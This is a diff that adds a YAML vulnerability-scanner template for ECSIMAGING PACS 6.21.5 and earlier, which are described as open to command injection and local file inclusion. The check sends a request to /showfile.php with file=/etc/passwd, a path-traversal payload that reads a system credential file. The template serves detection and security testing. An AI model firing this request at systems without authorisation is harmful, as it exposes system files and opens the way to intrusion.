@@ -1,0 +1,18 @@
+id: ecsimagingpacs-rce
+brief:
+    title: ECSIMAGING PACS <= 6.21.5 - Command Execution and Local File Inclusion
+    by: ritikchaddha
+    level: critical
+    about: ECSIMAGING PACS Application 6.21.5 and below suffer from a command injection vulnerability and a local file include vulnerability. The 'file' parameter on the page /showfile.php can be exploited to...
+    label:
+        - ecsimagingpacs
+        - rce
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/showfile.php?file=/etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
